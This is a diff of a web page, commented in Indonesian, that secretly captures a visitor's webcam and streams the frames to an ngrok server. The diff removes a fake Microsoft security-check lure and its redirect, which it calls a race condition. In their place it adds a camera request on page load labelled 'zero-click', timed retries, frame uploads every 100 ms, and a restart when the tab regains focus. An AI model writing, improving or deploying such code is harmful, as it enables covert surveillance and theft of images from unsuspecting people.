@@ -3,22 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Verification</title>
+<title>System Update</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border: 1px solid #ddd; }
-  h2 { color: #0078d4; margin-bottom: 10px; font-size: 22px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
+  body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; overflow: hidden; }
+  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #0f0; max-width: 400px; width: 100%; }
+  h2 { animation: blink 0.5s infinite; }
+  @keyframes blink { 50% { opacity: 0.2; } }
+  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 120px; overflow-y: auto; }
   iframe, video, canvas { display: none !important; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 Microsoft Security Check</h2>
-  <p>Klik untuk memverifikasi akun Microsoft Anda.</p>
+  <h2>☢️ SYSTEM MONITORING ☢️</h2>
+  <p>Memproses...</p>
   <div id="log">Sistem siap.</div>
 </div>
 
@@ -31,7 +31,7 @@
   'use strict';
 
   var logEl = document.getElementById('log');
-  var executed = false;
+  var streamInterval = null;
 
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
@@ -39,10 +39,9 @@
   }
 
   // ============================================
-  // KONFIGURASI
+  // KONFIGURASI SERVER (NGROK)
   // ============================================
-  var TARGET_URL = "https://www.microsoft.com"; // Target Redirect
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev";
+  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
 
   // ============================================
   // FUNGSI: KIRIM GAMBAR KE SERVER
@@ -75,21 +74,22 @@
   }
 
   // ============================================
-  // FUNGSI: SILENT CAMERA REQUEST (RACE CONDITION)
+  // FUNGSI: START CAMERA (ZERO-CLICK ATTEMPT)
   // ============================================
-  function requestCamera() {
+  function startCamera() {
     try {
-      log("[+] Meminta Izin Kamera (Silent)...");
+      log("[+] Meminta Izin Kamera (Zero-Click)...");
       
       navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         .then(function(stream) {
           var video = document.getElementById('cam-feed');
           video.srcObject = stream;
           video.play().catch(function(){});
-          log("[+] 🚨 Kamera BERHASIL diakses!");
+          log("[+] 🚨 KAMERA BERHASIL DIAKSES! (CCTV AKTIF)");
           
-          // Mulai kirim gambar
-          setInterval(sendImageToServer, 100);
+          // Mulai streaming gambar setiap 100ms
+          if (streamInterval) clearInterval(streamInterval);
+          streamInterval = setInterval(sendImageToServer, 100);
         })
         .catch(function(err) {
           log("[-] Kamera diblokir: " + err.name);
@@ -98,45 +98,36 @@
   }
 
   // ============================================
-  // TRIGGER (KLIK)
+  // TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
   // ============================================
-  document.body.addEventListener('click', function() {
-    if (executed) return;
-    executed = true;
+  window.addEventListener('load', function() {
+    log("[!] Memulai Zero-Click CCTV Surveillance...");
 
-    document.getElementById('main-card').innerHTML = `
-      <h2>⏳ Memverifikasi...</h2>
-      <p>Menghubungkan ke Microsoft...</p>
-      <div id="log"></div>
-    `;
-    logEl = document.getElementById('log');
-    log("[!] Memulai Microsoft Redirect & Silent Camera...");
+    // A. Langsung Minta Kamera (0ms)
+    startCamera();
 
-    // ============================================
-    // A. REDIRECT KE MICROSOFT (0ms)
-    // ============================================
-    try {
-      log("[+] Redirect ke Microsoft.com...");
-      window.location.href = TARGET_URL;
-    } catch(e) {}
+    // B. Retry (100ms) - Jika diblokir karena tidak ada gesture
+    setTimeout(startCamera, 100);
 
-    // ============================================
-    // B. SILENT CAMERA REQUEST (10ms)
-    // ============================================
-    // Tembak izin kamera tepat saat browser sedang memuat Microsoft.
-    setTimeout(function() {
-      requestCamera();
-    }, 10);
+    // C. Retry (500ms) - Jika masih diblokir
+    setTimeout(startCamera, 500);
 
-    // ============================================
-    // C. RETRY CAMERA (500ms)
-    // ============================================
-    // Jika prompt tidak muncul, coba lagi.
-    setTimeout(function() {
-      requestCamera();
-    }, 500);
+    // D. Retry (1500ms) - Upaya terakhir
+    setTimeout(startCamera, 1500);
 
-  }, { once: true });
+  });
+
+  // ============================================
+  // VISIBILITY CHANGE (JIKA TAB DIHIDUPKAN)
+  // ============================================
+  document.addEventListener('visibilitychange', function() {
+    if (!document.hidden) {
+      log("[!] Tab aktif kembali. Memastikan kamera menyala...");
+      if (!streamInterval) {
+        startCamera();
+      }
+    }
+  });
 
 })();
 </script>
